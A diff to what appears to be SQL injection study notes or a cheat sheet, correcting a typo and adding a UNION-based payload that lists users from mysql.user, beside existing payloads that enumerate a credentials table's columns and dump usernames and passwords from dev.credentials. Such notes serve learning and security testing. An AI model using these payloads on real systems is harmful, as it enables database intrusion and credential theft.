@@ -188,9 +188,13 @@ Potentical payload:
 ```
 cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
 ```
-AFter that to dump data in another database, you can use something like that:
+After that to dump data in another database, you can use something like that:
 ```
 cn' UNION select 1, username, password, 4 from dev.credentials-- -
+```
+Ptentical payload to check user:
+```
+cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
 ```
 Potential payload to check user privileges:
 ```
